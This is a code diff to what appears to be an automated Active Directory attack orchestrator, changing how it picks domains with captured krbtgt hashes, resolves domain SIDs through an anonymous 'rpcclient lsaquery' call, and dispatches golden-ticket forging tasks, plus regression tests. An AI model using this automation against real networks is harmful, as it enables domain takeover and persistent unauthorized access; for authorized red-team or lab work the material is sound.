@@ -9,7 +9,16 @@ use tokio::sync::watch;
 use tracing::{info, warn};
 
 use crate::orchestrator::dispatcher::Dispatcher;
-use crate::orchestrator::state::StateInner;
+use crate::orchestrator::state::{canonicalize_domain_label, StateInner};
+
+/// Wall-clock cap on the null-session `rpcclient lsaquery` fallback in
+/// [`resolve_domain_sid`]. One anonymous LSA RPC answers in well under a
+/// second against a reachable DC; anything longer is a connect retry against a
+/// host that is filtering or wedged. Kept below the 30 s automation tick so a
+/// dead DC cannot stall a whole `auto_trust_follow` pass.
+const LSAQUERY_TIMEOUT: Duration = Duration::from_secs(20);
+
+pub(crate) const GOLDEN_TICKET_DISPATCHED: &str = "golden_ticket_dispatched";
 
 /// Collect the set of domains that have a captured `krbtgt` hash but no
 /// successful golden-ticket forge yet. Returns lowercased domain names in
@@ -29,8 +38,16 @@ pub(crate) fn collect_pending_golden_ticket_domains(state: &StateInner) -> Vec<S
         if !h.username.eq_ignore_ascii_case("krbtgt") {
             continue;
         }
+        // Canonicalize before the SID lookup downstream: secretsdump can emit a
+        // krbtgt hash with `hash.domain="NORTH"` (NetBIOS flat) when the parent
+        // suffix wasn't visible to the parser. `domain_sids` is always
+        // FQDN-keyed, so passing the flat label straight through would miss the
+        // SID and defer the forge forever.
         let domain = if !h.domain.is_empty() {
-            h.domain.to_lowercase()
+            match canonicalize_domain_label(&h.domain, state) {
+                Some(d) => d,
+                None => continue,
+            }
         } else if let Some(d) = state.domains.first() {
             d.to_lowercase()
         } else {
@@ -41,6 +58,9 @@ pub(crate) fn collect_pending_golden_ticket_domains(state: &StateInner) -> Vec<S
         }
         let vuln_id = format!("golden_ticket_{domain}");
         if state.exploited_vulnerabilities.contains(&vuln_id) {
+            continue;
+        }
+        if state.is_processed(GOLDEN_TICKET_DISPATCHED, &domain) {
             continue;
         }
         out.push(domain);
@@ -77,7 +97,13 @@ pub(crate) fn gather_golden_ticket_inputs(
         .cloned()?;
 
     let domain_sid = state.domain_sids.get(&domain_lc).cloned();
-    let dc_ip = state.domain_controllers.get(&domain_lc).cloned();
+    // Use `resolve_dc_ip` rather than a raw `domain_controllers` lookup: a
+    // child DC whose hostname is the bare domain apex (`child.contoso.local`)
+    // is only mapped correctly if `register_dc` ran after the child domain
+    // became known — and `register_dc` doesn't re-fire once the host is already
+    // a known DC. `resolve_dc_ip`'s zone-apex hosts scan resolves it regardless
+    // of registration ordering, matching what `auto_trust_follow` already does.
+    let dc_ip = state.resolve_dc_ip(&domain_lc);
 
     let admin_cred = state
         .credentials
@@ -234,7 +260,7 @@ async fn try_forge_golden_ticket(dispatcher: &Arc<Dispatcher>, domain: &str) {
         }
     };
 
-    // ── Resolve domain SID if not cached ────────────────────────────
+    // Resolve domain SID if not cached
     if inputs.domain_sid.is_none() {
         if let Some(ref target_ip) = inputs.dc_ip {
             let result = resolve_domain_sid(
@@ -287,15 +313,16 @@ async fn try_forge_golden_ticket(dispatcher: &Arc<Dispatcher>, domain: &str) {
     {
         Ok(Some(task_id)) => {
             info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
-            // Mark per-domain immediately to prevent re-dispatch on the
-            // next 30s tick. Result processing also confirms on task
-            // completion (detects "Saving ticket in *.ccache" in output).
+            {
+                let mut state = dispatcher.state.write().await;
+                state.mark_processed(GOLDEN_TICKET_DISPATCHED, domain.to_string());
+            }
             if let Err(e) = dispatcher
                 .state
-                .set_golden_ticket(&dispatcher.queue, domain)
+                .persist_dedup(&dispatcher.queue, GOLDEN_TICKET_DISPATCHED, domain)
                 .await
             {
-                warn!(err = %e, "Failed to set golden ticket flag after dispatch");
+                warn!(err = %e, "Failed to persist golden ticket dispatch marker");
             }
         }
         Ok(None) => {}
@@ -382,22 +409,19 @@ pub(crate) async fn resolve_domain_sid(
     // parsed by `extract_lsaquery_domain_sid`. This unblocks the
     // child→parent forge path in `auto_trust_follow` when authenticated
     // lookupsid against the parent DC fails.
-    match tokio::process::Command::new("rpcclient")
+    match ares_tools::executor::CommandBuilder::new("rpcclient")
         .arg("-U")
         .arg("")
         .arg("-N")
         .arg(dc_ip)
         .arg("-c")
         .arg("lsaquery")
-        .output()
+        .timeout(LSAQUERY_TIMEOUT)
+        .execute()
         .await
     {
         Ok(out) => {
-            let combined = format!(
-                "{}\n{}",
-                String::from_utf8_lossy(&out.stdout),
-                String::from_utf8_lossy(&out.stderr)
-            );
+            let combined = format!("{}\n{}", out.stdout, out.stderr);
             if let Some((_flat, sid)) = ares_core::parsing::extract_lsaquery_domain_sid(&combined) {
                 info!(dc_ip = %dc_ip, sid = %sid, "Resolved domain SID via null-session lsaquery fallback");
                 return Some((sid, None));
@@ -459,8 +483,6 @@ mod tests {
         }
     }
 
-    // --- strip_ntlm_lm_prefix ---------------------------------------------
-
     #[test]
     fn strip_ntlm_lm_prefix_keeps_bare_ntlm() {
         let ntlm = "31d6cfe0d16ae931b73c59d7e0c089c0";
@@ -495,8 +517,6 @@ mod tests {
     fn strip_ntlm_lm_prefix_empty_string() {
         assert_eq!(strip_ntlm_lm_prefix(""), "");
     }
-
-    // --- collect_pending_golden_ticket_domains ----------------------------
 
     #[test]
     fn collect_pending_returns_empty_without_domain_admin() {
@@ -534,6 +554,28 @@ mod tests {
         let v = collect_pending_golden_ticket_domains(&s);
         assert_eq!(v.len(), 1);
         assert_eq!(v[0], "contoso.local");
+    }
+
+    #[test]
+    fn collect_pending_skips_dispatched_domain_without_marking_it_exploited() {
+        let mut s = StateInner::new("op-test".into());
+        s.has_domain_admin = true;
+        s.hashes.push(krbtgt_hash(
+            "contoso.local",
+            "31d6cfe0d16ae931b73c59d7e0c089c0",
+        ));
+        assert_eq!(
+            collect_pending_golden_ticket_domains(&s),
+            vec!["contoso.local"]
+        );
+
+        s.mark_processed(GOLDEN_TICKET_DISPATCHED, "contoso.local".into());
+
+        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
+        assert!(!s.has_golden_ticket);
+        assert!(!s
+            .exploited_vulnerabilities
+            .contains("golden_ticket_contoso.local"));
     }
 
     #[test]
@@ -600,7 +642,36 @@ mod tests {
         assert_eq!(v, vec!["contoso.local", "fabrikam.local"]);
     }
 
-    // --- gather_golden_ticket_inputs --------------------------------------
+    #[test]
+    fn collect_pending_canonicalizes_flat_netbios_domain_to_fqdn() {
+        // Regression: secretsdump on a child realm can emit hash.domain="NORTH"
+        // when the parent suffix isn't visible to the parser. The collector
+        // previously returned the bare "north" label, which downstream
+        // domain_sids lookups (always FQDN-keyed) missed forever and the forge
+        // deferred indefinitely. Now the flat label is resolved against
+        // state.domains before dedup.
+        let mut s = StateInner::new("op-test".into());
+        s.has_domain_admin = true;
+        s.domains.push("north.contoso.local".into());
+        s.domains.push("contoso.local".into());
+        s.hashes
+            .push(krbtgt_hash("NORTH", "31d6cfe0d16ae931b73c59d7e0c089c0"));
+        let v = collect_pending_golden_ticket_domains(&s);
+        assert_eq!(v, vec!["north.contoso.local"]);
+    }
+
+    #[test]
+    fn collect_pending_skips_unresolvable_flat_domain() {
+        // If a flat name has no matching FQDN in state, we must skip rather
+        // than guess (e.g. forging against state.domains[0] would attribute
+        // the krbtgt to the wrong realm).
+        let mut s = StateInner::new("op-test".into());
+        s.has_domain_admin = true;
+        s.domains.push("contoso.local".into());
+        s.hashes
+            .push(krbtgt_hash("MYSTERY", "31d6cfe0d16ae931b73c59d7e0c089c0"));
+        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
+    }
 
     #[test]
     fn gather_inputs_returns_none_without_krbtgt() {
@@ -646,6 +717,45 @@ mod tests {
         let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
         assert_eq!(inputs.domain_sid.as_deref(), Some("S-1-5-21-1-2-3"));
         assert_eq!(inputs.dc_ip.as_deref(), Some("192.168.58.10"));
+    }
+
+    #[test]
+    fn gather_inputs_resolves_zone_apex_child_dc_when_map_misfiled() {
+        // Regression: a child DC whose hostname is the bare domain apex
+        // (`north.contoso.local`) can be registered under the PARENT in the
+        // `domain_controllers` map when it's discovered before the child domain
+        // is known, and `register_dc` won't re-fire to correct it. A raw map
+        // lookup for the child domain then misses and the forge defers forever
+        // on "Cannot resolve domain SID". Going through `resolve_dc_ip` recovers
+        // the child DC IP from the hosts table via its zone-apex scan.
+        let mut s = StateInner::new("op-test".into());
+        s.has_domain_admin = true;
+        s.domains.push("contoso.local".into());
+        s.domains.push("north.contoso.local".into());
+        s.hashes.push(krbtgt_hash(
+            "north.contoso.local",
+            "31d6cfe0d16ae931b73c59d7e0c089c0",
+        ));
+        // Map misfiled: child DC's IP registered under the parent domain, with
+        // no entry at all for the child.
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.240".into());
+        s.hosts.push(ares_core::models::Host {
+            ip: "192.168.58.240".into(),
+            hostname: "north.contoso.local".into(),
+            os: String::new(),
+            roles: vec!["domain_controller".into()],
+            services: vec![],
+            is_dc: true,
+            owned: false,
+        });
+
+        let inputs = gather_golden_ticket_inputs(&s, "north.contoso.local").unwrap();
+        assert_eq!(
+            inputs.dc_ip.as_deref(),
+            Some("192.168.58.240"),
+            "child DC IP must resolve via zone-apex hosts scan despite the misfiled map"
+        );
     }
 
     #[test]
@@ -749,8 +859,6 @@ mod tests {
         assert!(inputs.lookup_cred.is_none());
     }
 
-    // --- resolve_admin_username -------------------------------------------
-
     #[test]
     fn resolve_admin_username_falls_back_to_default() {
         let s = StateInner::new("op-test".into());
@@ -764,8 +872,6 @@ mod tests {
             .insert("contoso.local".into(), "BuiltInAdmin".into());
         assert_eq!(resolve_admin_username(&s, "Contoso.Local"), "BuiltInAdmin");
     }
-
-    // --- build_golden_ticket_payload --------------------------------------
 
     fn baseline_inputs() -> GoldenTicketInputs {
         GoldenTicketInputs {
